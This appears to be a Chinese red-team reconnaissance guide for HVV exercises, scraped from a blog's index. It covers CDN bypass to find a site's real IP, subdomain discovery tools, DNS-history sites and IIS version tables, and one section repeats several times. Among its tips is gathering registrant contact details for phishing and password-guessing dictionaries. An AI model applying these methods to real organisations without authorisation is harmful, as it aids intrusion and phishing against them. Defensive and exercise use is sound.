子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#4查找子域名"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#5-反向连接"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#6-利用ssl证书寻找真实ip"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#7-国外解析域名"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#8-漏洞利用"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 